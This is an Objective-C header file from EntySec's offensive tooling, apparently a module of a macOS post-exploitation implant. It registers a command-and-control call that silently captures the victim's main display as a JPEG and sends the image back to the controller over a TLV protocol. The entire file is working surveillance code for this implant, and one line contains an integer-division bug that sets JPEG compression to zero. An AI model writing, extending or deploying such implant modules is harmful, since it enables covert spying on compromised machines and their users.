/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _UI_H_
#define _UI_H_

#include <tlv.h>
#include <api.h>
#include <c2.h>
#include <tlv_types.h>
#include <log.h>

#import <AVFoundation/AVFoundation.h>

#define UI_BASE 6

#define UI_SCREENSHOT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL)

static tlv_pkt_t *ui_screenshot(c2_t *c2)
{
    int quality;
    float compression;
    tlv_pkt_t *result;

    CGImageRef image;
    CFMutableDataRef newImageData;
    CGImageDestinationRef destination;
    NSDictionary *properties;
    NSData *newImage;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &quality);
    compression = quality / 100;

    @autoreleasepool
    {
        image = CGDisplayCreateImage(kCGDirectMainDisplay);
        newImageData = CFDataCreateMutable(NULL, 0);
        destination = CGImageDestinationCreateWithData(newImageData, kUTTypeJPEG, 1, NULL);
        properties = [NSDictionary dictionaryWithObjectsAndKeys:
                                   @(compression), kCGImageDestinationLossyCompressionQuality,
                                   nil];
        CGImageDestinationAddImage(destination, image, (__bridge CFDictionaryRef)properties);

        if (CGImageDestinationFinalize(destination))
        {
            newImage = (__bridge NSData *)newImageData;
            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
            tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)newImage.bytes, newImage.length);
        }
        else
        {
            result = api_craft_tlv_pkt(API_CALL_FAIL);
        }
    }

    return result;
}

void register_ui_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, UI_SCREENSHOT, ui_screenshot);
}

#endif